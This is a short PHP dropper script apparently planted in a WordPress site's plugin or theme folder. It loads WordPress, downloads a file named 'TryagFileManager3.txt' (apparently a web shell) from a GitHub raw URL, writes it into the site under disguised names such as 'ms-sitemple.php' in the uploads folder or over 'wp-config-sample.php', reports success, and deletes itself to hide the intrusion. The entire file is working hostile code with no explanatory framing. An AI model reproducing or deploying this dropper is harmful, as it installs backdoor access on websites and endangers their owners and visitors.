<?php
include_once('../../../wp-load.php');
//testexex
$request  = wp_remote_get('https://raw.githubusercontent.com/aron-tn/megaBot_Source/master/TryagFileManager3.txt');
if ( ! is_wp_error( $request )){
file_put_contents('../../../wp-content/uploads/assignments/ms-sitemple.php',$request['body']);
if (file_exists('../../../wp-content/uploads/assignments/ms-sitemple.php')) {echo 'ok:'.'1';unlink(__FILE__); exit;}

file_put_contents('../../../wp-config-sample.php',$request['body']);
if (file_exists('../../../wp-config-sample.php')) {echo 'ok:'.'2';unlink(__FILE__); exit;}

file_put_contents('../../store.php',$request['body']);
if (file_exists('../../store.php')) {echo 'ok:'.'3';unlink(__FILE__); exit;}

file_put_contents('assign.php',$request['body']);
if (file_exists('assign.php')) {echo 'ok:'.'4';unlink(__FILE__); exit;}
}


?>